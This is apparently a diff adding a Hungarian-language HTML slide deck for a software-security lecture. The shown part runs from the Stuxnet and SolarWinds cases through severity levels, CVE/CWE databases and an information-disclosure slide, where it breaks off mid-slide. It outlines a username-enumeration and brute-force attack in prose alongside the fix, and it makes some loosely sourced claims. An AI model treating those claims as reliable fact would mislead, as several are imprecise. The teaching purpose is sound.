@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Biztonsági Sérülékenységek</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&family=Inconsolata:wght@400;500;600&display=swap');
+
+:root {
+  --bg:    #0a0f1e;
+  --surf:  #0f1628;
+  --card:  #141d35;
+  --brd:   #1e2d50;
+  --brd2:  #263a68;
+  --text:  #d8e4ff;
+  --muted: #4a5f8a;
+
+  --crit:  #ef4444;
+  --high:  #f97316;
+  --med:   #f59e0b;
+  --low:   #3b82f6;
+  --none:  #6b7280;
+  --ok:    #10b981;
+  --acc:   #ef4444;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:var(--bg); color:var(--text); font-family:'Sora',sans-serif; min-height:100vh; overflow-x:hidden; }
+body::before {
+  content:''; position:fixed; inset:0;
+  background: radial-gradient(ellipse at 20% 0%, rgba(239,68,68,0.06) 0%, transparent 50%),
+              radial-gradient(ellipse at 80% 100%, rgba(249,115,22,0.04) 0%, transparent 50%);
+  pointer-events:none; z-index:0;
+}
+
+header {
+  position:relative; z-index:1; padding:1.2rem 1.3rem 0.85rem;
+  border-bottom:1px solid var(--brd2);
+  background:linear-gradient(180deg, rgba(239,68,68,0.06) 0%, transparent 100%);
+}
+.hdr-row { display:flex; align-items:flex-start; justify-content:space-between; gap:0.5rem; }
+h1 { font-size:1.4rem; font-weight:800; line-height:1.07; letter-spacing:-0.02em; }
+h1 span { color:var(--crit); }
+h1 em   { font-style:normal; color:var(--med); }
+.tag { font-family:'Inconsolata',monospace; font-size:0.56rem; padding:0.25rem 0.55rem; border-radius:4px; background:rgba(239,68,68,0.12); color:var(--crit); border:1px solid rgba(239,68,68,0.28); white-space:nowrap; margin-top:0.2rem; }
+header p { font-size:0.7rem; color:var(--muted); margin-top:0.25rem; font-family:'Inconsolata',monospace; }
+
+/* TOP BAR */
+.topbar { position:relative; z-index:1; background:var(--surf); border-bottom:1px solid var(--brd2); padding:0.75rem 1.3rem 0.65rem; }
+.tb-title { font-family:'Inconsolata',monospace; font-size:0.54rem; color:var(--muted); text-transform:uppercase; letter-spacing:0.09em; margin-bottom:0.5rem; }
+.vuln-steps { display:flex; align-items:center; gap:0; margin-bottom:0.45rem; }
+.vs-item { flex:1; display:flex; flex-direction:column; align-items:center; gap:0.18rem; position:relative; }
+.vs-item:not(:last-child)::after { content:''; position:absolute; right:0; top:11px; width:50%; height:2px; background:var(--brd); z-index:0; }
+.vs-item:not(:first-child)::before { content:''; position:absolute; left:0; top:11px; width:50%; height:2px; background:var(--brd); z-index:0; }
+.vs-dot { width:22px; height:22px; border-radius:50%; border:2px solid var(--brd2); background:var(--card); display:flex; align-items:center; justify-content:center; font-size:0.58rem; z-index:1; transition:all 0.35s; position:relative; }
+.vs-label { font-family:'Inconsolata',monospace; font-size:0.44rem; color:var(--muted); text-align:center; line-height:1.2; }
+.vs-item.active .vs-dot { transform:scale(1.25); box-shadow:0 0 10px currentColor; }
+.vs-item.done .vs-dot { opacity:0.55; }
+.vs-item.active .vs-label { font-weight:700; font-size:0.48rem; }
+.sev-chips { display:flex; gap:4px; flex-wrap:wrap; }
+.sev-chip { font-family:'Inconsolata',monospace; font-size:0.54rem; font-weight:700; padding:0.16rem 0.45rem; border-radius:3px; border:1px solid; opacity:0.3; transition:opacity 0.3s; }
+.sev-chip.on { opacity:1; }
+
+/* CONTENT */
+.content { position:relative; z-index:1; padding:0.9rem 1.3rem; min-height:275px; }
+.shdr { display:flex; align-items:center; gap:0.6rem; margin-bottom:0.85rem; }
+.sico { width:36px; height:36px; border-radius:9px; flex-shrink:0; display:flex; align-items:center; justify-content:center; font-size:1rem; border:1.5px solid var(--brd2); background:var(--card); }
+.stitle { font-size:0.95rem; font-weight:800; letter-spacing:-0.02em; }
+.ssub { font-family:'Inconsolata',monospace; font-size:0.56rem; color:var(--muted); margin-top:0.03rem; }
+
+/* CHAT */
+.chat { display:flex; flex-direction:column; gap:0.5rem; margin-bottom:0.7rem; }
+.msg { display:flex; gap:0.4rem; align-items:flex-start; opacity:0; transform:translateY(6px); transition:opacity 0.3s, transform 0.3s; }
+.msg.show { opacity:1; transform:translateY(0); }
+.msg.r { flex-direction:row-reverse; }
+.av { width:30px; height:30px; border-radius:7px; display:flex; align-items:center; justify-content:center; font-size:0.9rem; flex-shrink:0; border:1px solid var(--brd2); background:var(--card); }
+.bub { max-width:82%; padding:0.48rem 0.68rem; border-radius:9px; font-size:0.77rem; line-height:1.55; border:1px solid var(--brd2); background:var(--card); }
+.bub.l { border-bottom-left-radius:2px; }
+.bub.r2 { border-bottom-right-radius:2px; text-align:right; }
+.who { font-family:'Inconsolata',monospace; font-size:0.55rem; font-weight:600; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.1rem; }
+
+/* CODE BLOCK */
+.code-block {
+  background:#0d1117; border:1px solid var(--brd2); border-radius:8px;
+  padding:0.65rem 0.8rem; margin:0.45rem 0; font-family:'Inconsolata',monospace;
+  font-size:0.72rem; line-height:1.7; overflow-x:auto;
+}
+.cb-label { font-family:'Inconsolata',monospace; font-size:0.52rem; color:var(--muted); text-transform:uppercase; letter-spacing:0.07em; margin-bottom:0.3rem; display:flex; align-items:center; gap:0.4rem; }
+.cb-lang { background:rgba(239,68,68,0.15); color:var(--crit); padding:0.1rem 0.35rem; border-radius:3px; font-weight:700; }
+.cb-ok { background:rgba(16,185,129,0.15); color:var(--ok); padding:0.1rem 0.35rem; border-radius:3px; font-weight:700; }
+.c-kw { color:#ff7b72; }
+.c-fn { color:#d2a8ff; }
+.c-str { color:#a5d6ff; }
+.c-var { color:#ffa657; }
+.c-cmt { color:#8b949e; font-style:italic; }
+.c-bad { background:rgba(239,68,68,0.18); border-radius:3px; padding:0 2px; }
+.c-good { background:rgba(16,185,129,0.15); border-radius:3px; padding:0 2px; }
+.c-num { color:#79c0ff; }
+
+/* SEVERITY BADGE */
+.sev-badge { display:inline-flex; align-items:center; gap:0.3rem; font-family:'Inconsolata',monospace; font-size:0.6rem; font-weight:700; padding:0.2rem 0.55rem; border-radius:4px; border:1px solid; margin-bottom:0.45rem; }
+
+/* ATTACK FLOW */
+.attack-flow { background:var(--card); border:1.5px solid rgba(239,68,68,0.3); border-radius:9px; padding:0.65rem 0.75rem; margin:0.45rem 0; }
+.af-title { font-family:'Inconsolata',monospace; font-size:0.54rem; color:var(--crit); text-transform:uppercase; letter-spacing:0.07em; margin-bottom:0.45rem; }
+.af-step { display:flex; align-items:center; gap:0.5rem; margin:0.28rem 0; font-size:0.72rem; }
+.af-num { font-family:'Inconsolata',monospace; font-size:0.62rem; font-weight:700; color:var(--crit); width:18px; flex-shrink:0; }
+.af-arr { color:var(--muted); font-size:0.6rem; }
+
+/* FIX BOX */
+.fix-box { background:rgba(16,185,129,0.06); border:1.5px solid rgba(16,185,129,0.3); border-radius:9px; padding:0.65rem 0.75rem; margin:0.45rem 0; }
+.fx-title { font-family:'Inconsolata',monospace; font-size:0.54rem; color:var(--ok); text-transform:uppercase; letter-spacing:0.07em; margin-bottom:0.35rem; }
+.fx-item { display:flex; align-items:flex-start; gap:0.4rem; font-size:0.72rem; margin:0.22rem 0; }
+
+/* IBOX */
+.ibox { border-radius:8px; padding:0.55rem 0.75rem; font-size:0.74rem; line-height:1.55; margin:0.45rem 0; border:1px solid var(--brd2); background:var(--card); border-left:3px solid var(--crit); }
+.ibox strong { font-weight:700; }
+.ibox.ok-b { border-left-color:var(--ok); }
+.ibox.ok-b strong { color:var(--ok); }
+.ibox.warn-b { border-left-color:var(--med); }
+.ibox.warn-b strong { color:var(--med); }
+
+/* HIBA SZINTEK */
+.hiba-grid { display:flex; flex-direction:column; gap:0.3rem; margin:0.45rem 0; }
+.hiba-row { display:flex; align-items:center; gap:0.6rem; padding:0.42rem 0.65rem; background:var(--card); border-radius:8px; border:1px solid var(--brd2); font-size:0.74rem; }
+.hiba-sev { font-family:'Inconsolata',monospace; font-size:0.6rem; font-weight:700; width:70px; flex-shrink:0; }
+.hiba-desc { flex:1; }
+.hiba-ex { font-size:0.65rem; color:var(--muted); font-family:'Inconsolata',monospace; margin-top:0.05rem; }
+
+/* STAT */
+.stat-table { background:var(--card); border:1.5px solid var(--brd2); border-radius:9px; overflow:hidden; margin:0.45rem 0; }
+.st-hdr { background:var(--surf); padding:0.3rem 0.7rem; font-family:'Inconsolata',monospace; font-size:0.52rem; color:var(--muted); text-transform:uppercase; letter-spacing:0.07em; border-bottom:1px solid var(--brd); }
+.st-row { display:flex; align-items:center; padding:0.38rem 0.7rem; border-bottom:1px solid var(--brd); gap:0.6rem; }
+.st-row:last-child { border-bottom:none; }
+.st-name { font-size:0.72rem; flex:1; }
+.st-bar { height:10px; border-radius:3px; }
+.st-val { font-family:'Inconsolata',monospace; font-size:0.62rem; font-weight:700; width:80px; text-align:right; flex-shrink:0; }
+
+/* CHECKLIST */
+.cklist { display:flex; flex-direction:column; gap:0.35rem; margin:0.45rem 0; }
+.cli { display:flex; align-items:flex-start; gap:0.5rem; padding:0.42rem 0.65rem; background:var(--card); border:1px solid var(--brd2); border-radius:8px; font-size:0.75rem; line-height:1.45; }
+.cli-i { flex-shrink:0; font-size:0.88rem; }
+.cli strong { display:block; font-weight:700; font-size:0.76rem; margin-bottom:0.03rem; }
+.cli span { color:var(--muted); font-size:0.68rem; font-family:'Inconsolata',monospace; }
+
+/* SUMGRID */
+.sumgrid { display:grid; grid-template-columns:1fr 1fr; gap:0.4rem; margin:0.45rem 0; }
+.sbox { background:var(--card); border:1px solid var(--brd2); border-radius:8px; padding:0.6rem; text-align:center; }
+.sbox .ico { font-size:1.2rem; display:block; margin-bottom:0.15rem; }
+.sbox .val { font-size:0.88rem; font-weight:800; }
+.sbox .lbl { font-family:'Inconsolata',monospace; font-size:0.52rem; color:var(--muted); margin-top:0.04rem; }
+
+/* VULN PILLS */
+.vuln-types { display:flex; flex-wrap:wrap; gap:0.3rem; margin:0.45rem 0; }
+.vt { font-family:'Inconsolata',monospace; font-size:0.58rem; font-weight:700; padding:0.2rem 0.5rem; border-radius:4px; border:1px solid; cursor:default; }
+
+/* NAV */
+.nav { position:sticky; bottom:0; z-index:10; background:var(--bg); border-top:1px solid var(--brd2); padding:0.7rem 1.3rem; display:flex; align-items:center; gap:0.5rem; }
+.btn { font-family:'Inconsolata',monospace; font-size:0.63rem; font-weight:600; padding:0.52rem 1rem; border-radius:7px; cursor:pointer; transition:all 0.18s; text-transform:uppercase; letter-spacing:0.04em; }
+.btnp { background:transparent; color:var(--muted); border:1px solid var(--brd2); }
+.btnp:hover { color:var(--text); }
+.btnp:disabled { opacity:0.2; cursor:not-allowed; }
+.btnn { flex:1; background:rgba(239,68,68,0.12); color:var(--crit); border:1px solid rgba(239,68,68,0.3); }
+.btnn:hover { background:rgba(239,68,68,0.22); }
+.ctr { font-family:'Inconsolata',monospace; font-size:0.57rem; color:var(--muted); white-space:nowrap; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="hdr-row">
+    <h1><span>Biztonsági</span><br>Sérülékeny<br><em>ségek</em></h1>
+    <div class="tag">5. előadás // CVE</div>
+  </div>
+  <p>// XSS · SQL Injection · Buffer Overflow · CSRF · Path Traversal</p>
+</header>
+
+<div class="topbar">
+  <div class="tb-title">// témakörök</div>
+  <div class="vuln-steps" id="vulnSteps"></div>
+  <div class="sev-chips" id="sevChips"></div>
+</div>
+
+<div class="content" id="content"></div>
+
+<div class="nav">
+  <button class="btn btnp" id="bprev" onclick="prev()" disabled>← Vissza</button>
+  <span class="ctr" id="ctr">1 / 18</span>
+  <button class="btn btnn" id="bnext" onclick="next()">Következő →</button>
+</div>
+
+<script>
+const TOPICS = [
+  { label:'Bevezető\nStuxnet',   color:'var(--crit)',  icon:'⚠️' },
+  { label:'Hibák\nosztályoz.',   color:'var(--high)',  icon:'📊' },
+  { label:'Info\nszivárgás',     color:'var(--med)',   icon:'👁️' },
+  { label:'XSS\nCSRF',          color:'var(--med)',   icon:'💉' },
+  { label:'SQL\nInject.',        color:'var(--crit)',  icon:'🗄️' },
+  { label:'Buffer\nOverflow',    color:'var(--crit)',  icon:'💥' },
+  { label:'Egyéb\nfajták',       color:'var(--high)',  icon:'🔓' },
+  { label:'Össze\nfoglalás',     color:'var(--ok)',    icon:'∑' },
+];
+
+const SEV_CHIPS = [
+  { label:'5. KRITIKUS', color:'var(--crit)' },
+  { label:'4. MAGAS',    color:'var(--high)' },
+  { label:'3. KÖZEPES',  color:'var(--med)'  },
+  { label:'2. ALACSONY', color:'var(--low)'  },
+  { label:'1. NINCS',    color:'var(--none)' },
+];
+
+const STEPS = [
+
+  // ── 0. BEVEZETŐ ─────────────────────────────────────────────────
+  {
+    topic:0, sev:[],
+    render:()=>`
+      <div class="shdr"><div class="sico">🌐</div>
+        <div><div class="stitle">Miért lett kritikus a biztonság?</div>
+        <div class="ssub">// standalone → hálózat → internet — exponenciális kockázat</div></div>
+      </div>
+      <div class="chat">
+        <div class="msg show">
+          <div class="av">👨‍🏫</div>
+          <div class="bub l"><div class="who" style="color:var(--crit)">Oktató</div>
+            Régen egy szoftverhiba "stand alone" gépen helyi hatású volt — max a gép tulajdonosa szenvedett. Ma egy hiba az interneten terjed. Mennyi embert érint?
+          </div>
+        </div>
+        <div class="msg show r" style="transition-delay:.15s">
+          <div class="av">🙋</div>
+          <div class="bub r2"><div class="who" style="color:var(--low);text-align:right">Tanuló</div>
+            Hát ha mindenki az internetet használja... akár milliárdokat?
+          </div>
+        </div>
+        <div class="msg show" style="transition-delay:.3s">
+          <div class="av">👨‍🏫</div>
+          <div class="bub l"><div class="who" style="color:var(--crit)">Oktató</div>
+            Pontosan. A Log4Shell (2021) sérülékenység 3 milliárd eszközt érintett. Egy hibás sor Java kódban — és a világ összes szervere potenciálisan kompromittált volt. Ez az internetesítés következménye.
+          </div>
+        </div>
+      </div>
+      <div style="background:var(--card);border:1.5px solid var(--brd2);border-radius:9px;overflow:hidden;margin:0.45rem 0">
+        <div style="background:var(--surf);padding:0.3rem 0.7rem;font-family:'Inconsolata',monospace;font-size:0.52rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.07em;border-bottom:1px solid var(--brd)">// kockázat növekedése</div>
+        <div style="display:flex;align-items:center;padding:0.4rem 0.7rem;border-bottom:1px solid var(--brd);gap:0.6rem">
+          <div style="font-size:0.7rem;flex:1">🖥️ Stand-alone szoftver hibája</div>
+          <div style="height:10px;width:40px;background:rgba(107,114,128,0.5);border-radius:2px"></div>
+          <div style="font-family:'Inconsolata',monospace;font-size:0.62rem;color:var(--none);width:60px;text-align:right">1 gép</div>
+        </div>
+        <div style="display:flex;align-items:center;padding:0.4rem 0.7rem;border-bottom:1px solid var(--brd);gap:0.6rem">
+          <div style="font-size:0.7rem;flex:1">🔗 Hálózatban lévő szoftver hibája</div>
+          <div style="height:10px;width:120px;background:rgba(245,158,11,0.5);border-radius:2px"></div>
+          <div style="font-family:'Inconsolata',monospace;font-size:0.62rem;color:var(--med);width:60px;text-align:right">100s gép</div>
+        </div>
+        <div style="display:flex;align-items:center;padding:0.4rem 0.7rem;gap:0.6rem">
+          <div style="font-size:0.7rem;flex:1">🌍 Internetes szoftver hibája</div>
+          <div style="height:10px;flex:1;background:linear-gradient(90deg,rgba(239,68,68,0.8),rgba(239,68,68,0.3));border-radius:2px"></div>
+          <div style="font-family:'Inconsolata',monospace;font-size:0.62rem;color:var(--crit);width:60px;text-align:right">milliárdok</div>
+        </div>
+      </div>
+      <div class="ibox warn-b"><strong>A KGB visszahozta az írógépeket</strong> — ez nem vicc. Olyan titkos dokumentumok kezelésénél, ahol nem kockáztathatnak digitális lehallgatást, valóban visszatértek az analóg eszközökhöz. Az internetesítés kockázata valós.</div>
+    `
+  },
+
+  // ── 1. STUXNET ──────────────────────────────────────────────────
+  {
+    topic:0, sev:[0],
+    render:()=>`
+      <div class="shdr"><div class="sico" style="border-color:rgba(239,68,68,0.5)">☢️</div>
+        <div><div class="stitle">Stuxnet — az első kiberfegyver</div>
+        <div class="ssub">// 2010, Irán, urándúsítók — valódi pusztítás kóddal</div></div>
+      </div>
+      <div style="background:rgba(239,68,68,0.05);border:2px solid rgba(239,68,68,0.3);border-radius:11px;padding:0.8rem;margin-bottom:0.45rem">
+        <div style="font-family:'Inconsolata',monospace;font-size:0.56rem;color:var(--crit);font-weight:700;text-transform:uppercase;letter-spacing:0.06em;margin-bottom:0.35rem">KRITIKUS ESET — 2010, Iráni nukleáris program</div>
+        <div class="cklist" style="margin:0">
+          <div class="cli" style="border-left:3px solid var(--crit)">
+            <div class="cli-i">🐛</div>
+            <div><strong>3 rétegen áthaló komplex vírus</strong>
+            <span>Windows OS → Siemens Simatic SCADA rendszer → PLC programok. Mindhárom rétegen külön "0-day" exploit-ot használt.</span></div>
+          </div>
+          <div class="cli" style="border-left:3px solid var(--crit)">
+            <div class="cli-i">🎯</div>
+            <div><strong>Precíz célzás: iráni urándúsítók</strong>
+            <span>Kifejezetten Siemens inverteres motormeghajtókat támadott — azokat, amik iráni urándúsító centrifugákon futottak. Más gépeken inaktív maradt.</span></div>
+          </div>
+          <div class="cli" style="border-left:3px solid var(--crit)">
+            <div class="cli-i">💥</div>
+            <div><strong>2010 nov. 16: Irán leállítja az urándúsítókat</strong>
+            <span>A centrifugák több mint 20%-a fizikailag megsemmisült. A kártevő elérte a célját. Becslések szerint 1-2 évvel visszavetette az iráni nukleáris programot.</span></div>
+          </div>
+          <div class="cli" style="border-left:3px solid var(--med)">
+            <div class="cli-i">❓</div>
+            <div><strong>Ma sem tudni, ki írta</strong>
+            <span>Nagy team, komoly pénz, állami szintű erőforrások kelltek hozzá. Az USA és Izrael neve merül fel — de sosem ismerték el. Az első ismert kiberfegyver.</span></div>
+          </div>
+        </div>
+      </div>
+      <div class="ibox"><strong>Tanulság:</strong> A szoftverbiztonsági rések nem csak adatlopásra használhatók — fizikai pusztítást is okozhatnak. Az ipari vezérlőrendszerek (SCADA) biztonsága nemzeti biztonsági kérdés. Szoftver = fizikai valóság.</div>
+    `
+  },
+
+  // ── 2. MI LEHET TÁMADÁS TÁRGYA ──────────────────────────────────
+  {
+    topic:0, sev:[],
+    render:()=>`
+      <div class="shdr"><div class="sico">🎯</div>
+        <div><div class="stitle">Mi lehet a támadás tárgya?</div>
+        <div class="ssub">// 4 fő kategória — szándékostól a véletlenig</div></div>
+      </div>
+      <div class="cklist">
+        <div class="cli" style="border-left:3px solid var(--none)">
+          <div class="cli-i">🐛</div>
+          <div><strong>1. Szoftverhiba — ténylegesen hibásan működő kód</strong>
+          <span>A komplexitás miatt előfordul. Pl. az integer overflow — ha egy szám "körbeér" és negatív lesz, ahol pozitívnak kellene lennie. Boeing 787: minden 248 nap repülés után nullázódnia kellett a rendszernek egy 32-bit overflow miatt.</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--med)">
+          <div class="cli-i">🚪</div>
+          <div><strong>2. Hibás inputszűrés — az első védelmi vonal hibája</strong>
+          <span>A szoftver elfogad olyan bemenetet, amit nem kellene. Az összes SQL injection, XSS, buffer overflow alapvetően erre vezethető vissza: a fejlesztő nem szűrte a felhasználói inputot.</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--high)">
+          <div class="cli-i">🤦</div>
+          <div><strong>3. Feledékenységből nyitva hagyott ajtó</strong>
+          <span>Több feltétel együttállását nem vizsgálják. Pl.: az admin funkció HTTPS-en védett — de a fejlesztő elfelejtette, hogy HTTP-n is elérhető. Vagy: az API végpont ellenőrzi a jogosultságot, de csak a GET kéréseknél, POST-nál nem.</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--crit)">
+          <div class="cli-i">😈</div>
+          <div><strong>4. Szándékosan nyitva hagyott hátsóajtó (backdoor)</strong>
+          <span>Szándékosan beépített belépési pont — vagy vészhelyzetre, vagy illegális célra. Pl. 2020: SolarWinds hack — a hackerek a szoftver build folyamatába épültek be, és backdoor-t terjesztettek a frissítésekkel 18 000 cég felé.</span></div>
+        </div>
+      </div>
+      <div class="ibox warn-b"><strong>Kódolási hibák száma:</strong> Ipari átlag: 15–50 hiba / 1000 sor · Microsoft termékek kiadás ELŐTT: 10–20 hiba / 1000 sor, UTÁN: 0.5 hiba/1000 sor · Harlan Mills "cleanroom" módszer: 0.1 hiba/1000 sor kiadás után (legjobb)</div>
+    `
+  },
+
+  // ── 3. HIBÁK OSZTÁLYOZÁSA ────────────────────────────────────────
+  {
+    topic:1, sev:[4,3,2,1,0],
+    render:()=>`
+      <div class="shdr"><div class="sico">📊</div>
+        <div><div class="stitle">Szoftverhibák osztályozása — 5 szint</div>
+        <div class="ssub">// biztonsági hatásuk alapján</div></div>
+      </div>
+      <div class="hiba-grid">
+        <div class="hiba-row" style="border-left:4px solid var(--none)">
+          <div class="hiba-sev" style="color:var(--none)">1. NINCS</div>
+          <div>
+            <div class="hiba-desc">Biztonsági hatás nélküli, funkcionális hiba</div>
+            <div class="hiba-ex">Pl. a gomb rossz helyen jelenik meg mobilon. Bosszantó, de nem veszélyes.</div>
+          </div>
+        </div>
+        <div class="hiba-row" style="border-left:4px solid var(--low)">
+          <div class="hiba-sev" style="color:var(--low)">2. ALACSONY</div>
+          <div>
+            <div class="hiba-desc">Nem igényel azonnali beavatkozást, info szivárgás</div>
+            <div class="hiba-ex">Pl. hibaüzenetben kiderül az osztálynév: "NullPointerException at UserService.java:142" — egy hacker ebből kitalálja a fájlstruktúrát.</div>
+          </div>
+        </div>
+        <div class="hiba-row" style="border-left:4px solid var(--med)">
+          <div class="hiba-sev" style="color:var(--med)">3. KÖZEPES</div>
+          <div>
+            <div class="hiba-desc">Közvetlen kockázat, sürgős beavatkozás kell</div>
+            <div class="hiba-ex">Pl. XSS — megtévesztéssel kliens oldali adatok szerezhetők meg. Az Alkotmánybíróság weboldalán XSS-sel írták át az alaptörvényt!</div>
+          </div>
+        </div>
+        <div class="hiba-row" style="border-left:4px solid var(--high)">
+          <div class="hiba-sev" style="color:var(--high)">4. MAGAS</div>
+          <div>
+            <div class="hiba-desc">Azonnali beavatkozás, felhasználók adatai veszélyben</div>
+            <div class="hiba-ex">Pl. SQL injection — a támadó hozzáfér a szerveren lévő összes felhasználó adatához: jelszavakhoz, bankkártya számokhoz.</div>
+          </div>
+        </div>
+        <div class="hiba-row" style="border-left:4px solid var(--crit)">
+          <div class="hiba-sev" style="color:var(--crit)">5. KRITIKUS</div>
+          <div>
+            <div class="hiba-desc">Távoli kódfuttatás lehetséges, milliókat érint</div>
+            <div class="hiba-ex">Pl. Buffer overflow az OS API-ban — a hibán át BÁRKI futtathat kódot a gépeden távolról. Ha 1 milliárd ember használja az OS-t...</div>
+          </div>
+        </div>
+      </div>
+    `
+  },
+
+  // ── 4. SÉRÜLÉKENYSÉGI ADATBÁZISOK ───────────────────────────────
+  {
+    topic:1, sev:[],
+    render:()=>`
+      <div class="shdr"><div class="sico">🗄️</div>
+        <div><div class="stitle">Sérülékenységi adatbázisok</div>
+        <div class="ssub">// CERT · CVE · CWE — hol tartják nyilván a hibákat</div></div>
+      </div>
+      <div class="cklist">
+        <div class="cli" style="border-left:3px solid var(--crit)">
+          <div class="cli-i">🚨</div>
+          <div><strong>CERT — Computer Emergency Response Team (1988)</strong>
+          <span>A DARPA (US Defense Dept.) alapította. Közel félmillió biztonsági incidens bejelentés érkezett be 1988 óta. Magyar változat: www.cert-hungary.gov</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--high)">
+          <div class="cli-i">📋</div>
+          <div><strong>CVE — Common Vulnerabilities and Exposures</strong>
+          <span>Minden egyes sérülékenységet egyedi számmal lát el. Pl: CVE-2021-44228 = Log4Shell (Log4j kritikus hiba). CVE-2007-0038 = WinXP kernel32.dll buffer overflow. Ingyenesen kereshető: cve.mitre.org</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--med)">
+          <div class="cli-i">📚</div>
+          <div><strong>CWE — Common Weakness Enumeration</strong>
+          <span>Nem konkrét hibákat, hanem hibaKATEGÓRIÁKAT katalogizál. Pl. CWE-89 = SQL Injection kategória. Segít a biztonságos architektúra tervezésében. cwe.mitre.org</span></div>
+        </div>
+      </div>
+      <div class="chat">
+        <div class="msg show">
+          <div class="av">💻</div>
+          <div class="bub l"><div class="who" style="color:var(--low)">Fejlesztő</div>
+            Szóval ha hibát találok egy nyílt forráskódú library-ban, hogyan jelzem?
+          </div>
+        </div>
+        <div class="msg show r" style="transition-delay:.15s">
+          <div class="av">🔒</div>
+          <div class="bub r2"><div class="who" style="color:var(--ok);text-align:right">Security mérnök</div>
+            Bejelented a CERT-nek vagy közvetlenül a CVE-nek. Kapnak egy CVE számot. A Snyk/Dependabot automatikusan figyeli ezeket és jelez ha az npm/Maven csomagod érintett.
+          </div>
+        </div>
+      </div>
+      <div class="ibox warn-b"><strong>Miért fontosak?</strong> Ha megjelenik egy CVE szám, minden biztonsági szkenner (Snyk, Dependabot, Aqua Security) azonnal értesíti a fejlesztőket, akik az érintett library-t használják. Ezért 0-day exploitot hetek alatt lepatchelnek.</div>
+    `
+  },
+
+  // ── 5. SÉRÜLÉKENYSÉGEK TÍPUSAI ÁTTEKINTŐ ────────────────────────
+  {
+    topic:2, sev:[],
+    render:()=>`
+      <div class="shdr"><div class="sico">📋</div>
+        <div><div class="stitle">Sérülékenységfajták — CVE adatbázis alapján</div>
+        <div class="ssub">// a legelterjedtebb típusok</div></div>
+      </div>
+      <div class="vuln-types">
+        <div class="vt" style="background:rgba(239,68,68,0.12);color:var(--crit);border-color:rgba(239,68,68,0.3)">💥 Buffer Overflow</div>
+        <div class="vt" style="background:rgba(239,68,68,0.12);color:var(--crit);border-color:rgba(239,68,68,0.3)">🗄️ SQL Injection</div>
+        <div class="vt" style="background:rgba(249,115,22,0.12);color:var(--high);border-color:rgba(249,115,22,0.3)">💉 XSS</div>
+        <div class="vt" style="background:rgba(249,115,22,0.12);color:var(--high);border-color:rgba(249,115,22,0.3)">🔄 CSRF</div>
+        <div class="vt" style="background:rgba(245,158,11,0.12);color:var(--med);border-color:rgba(245,158,11,0.3)">📁 Path Traversal</div>
+        <div class="vt" style="background:rgba(245,158,11,0.12);color:var(--med);border-color:rgba(245,158,11,0.3)">📤 Fájl Beszúrás</div>
+        <div class="vt" style="background:rgba(59,130,246,0.12);color:var(--low);border-color:rgba(59,130,246,0.3)">👁️ Info Szivárgás</div>
+        <div class="vt" style="background:rgba(59,130,246,0.12);color:var(--low);border-color:rgba(59,130,246,0.3)">💥 DoS / DDoS</div>
+        <div class="vt" style="background:rgba(107,114,128,0.12);color:var(--muted);border-color:rgba(107,114,128,0.3)">⬆️ Jogosultság szerzés</div>
+        <div class="vt" style="background:rgba(107,114,128,0.12);color:var(--muted);border-color:rgba(107,114,128,0.3)">🔑 Auth hiba</div>
+        <div class="vt" style="background:rgba(107,114,128,0.12);color:var(--muted);border-color:rgba(107,114,128,0.3)">🔀 HTTP resp. split</div>
+        <div class="vt" style="background:rgba(107,114,128,0.12);color:var(--muted);border-color:rgba(107,114,128,0.3)">🧩 Memória korrupció</div>
+      </div>
+      <div class="chat">
+        <div class="msg show">
+          <div class="av">👨‍🏫</div>
+          <div class="bub l"><div class="who" style="color:var(--crit)">Oktató</div>
+            A következő slide-okon ezeket mind konkrét kódpéldákon mutatom be — hogy pontosan MIÉRT veszélyes, és MIT kell tenni helyette. Kezdjük az információ szivárgással — ez a leggyakoribb és leggyakrabban figyelmen kívül hagyott hiba.
+          </div>
+        </div>
+      </div>
+      <div class="ibox"><strong>Fontos szemlélet:</strong> Ezek mind az INPUT VALIDÁCIÓ hiányára, a FELESLEGES INFORMATION LEAKAGE-re, vagy a MEMÓRIA KEZELÉSI HIBÁKRA vezethetők vissza. Ha ezt a 3 dolgot helyesen csinálod, az esetek 80%-át megelőzöd.</div>
+    `
+  },
+
+  // ── 6. INFORMATION DISCLOSURE ───────────────────────────────────
+  {
+    topic:2, sev:[1],
+    render:()=>`
+      <div class="shdr"><div class="sico" style="border-color:rgba(59,130,246,0.5)">👁️</div>
+        <div><div class="stitle">Információ szivárgás</div>
+        <div class="ssub">// a szoftver a lehető legkevesebb adatot szolgáltassa</div></div>
+      </div>
+      <div class="sev-badge" style="background:rgba(59,130,246,0.1);color:var(--low);border-color:rgba(59,130,246,0.3)">⚠️ 2. SZINT — ALACSONY HATÁSÚ</div>
+      <div class="code-block">
+        <div class="cb-label"><div class="cb-lang">ROSSZ — WordPress login hibaüzenet</div></div>
+        <span class="c-cmt">// Hibás felhasználónévnél:</span>
+        <br><span class="c-str">"Hibás felhasználónév: <span class="c-bad">admin</span>"</span>
+        <br><br><span class="c-cmt">// Hibás jelszónál:</span>
+        <br><span class="c-str">"Helyes felhasználónév, de hibás jelszó"</span>
+      </div>
+      <div class="attack-flow">
+        <div class="af-title">// Hogyan használja ki egy hacker</div>
+        <div class="af-step"><div class="af-num">1.</div><div>Próbálgatja: "admin/admin" → "Hibás jelszó" → TUDJA, hogy az admin user létezik!</div></div>
+        <div class="af-step"><div class="af-num">2.</div><div>Most már csak a jelszót kell bruteforce-olni — nem kell a usernevet is kitalálni</div></div>
+        <div class="af-step"><div class="af-num">3.</div><div>Automatizált brute-force eszközzel 10 000 jelszót próbál másodpercenként</div></div>
+      </div>
+      <div class="fix-box">
+        <div class="fx-title">✅ HELYES megoldás</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>Mindig ugyanaz az üzenet:</strong> "Hibás felhasználónév vagy jelszó" — soha ne áruld el melyik a rossz</div>
